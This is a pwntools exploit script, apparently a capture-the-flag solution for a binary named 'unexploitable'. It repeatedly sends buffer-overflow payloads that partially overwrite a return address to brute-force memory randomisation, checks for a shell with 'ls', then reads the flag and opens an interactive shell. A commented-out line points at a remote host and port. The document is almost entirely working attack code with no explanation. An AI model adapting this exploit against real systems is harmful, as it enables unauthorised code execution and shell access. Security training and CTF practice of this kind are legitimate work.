from pwn import*
context(os='linux',arch='amd64',log_level='debug')

cnt = 0

while True:
	try:
		s = process('./unexploitable')
		#s = remote('47.95.3.91',36636)
		success('count:\t' + hex(cnt))
		cnt = cnt + 1
		s.send(b'a'*0x10 + b'b'*0x8 + b'\x50\x06')
		sleep(0.1)

		s.send(b'a'*0x10 + b'b'*0x10 + b'\x50\x06')
		sleep(0.1)

		s.send(b'a'*0x10 + b'b'*0x18 + b'\x02\x83\xeb')

		s.sendline(b"ls")
		ss = s.recv(timeout = 0.5)
		if(b'flag' in ss):
			break
		else:
			s.close()
			continue
	except:
		s.close()
s.sendline(b'cat flag')
s.interactive()
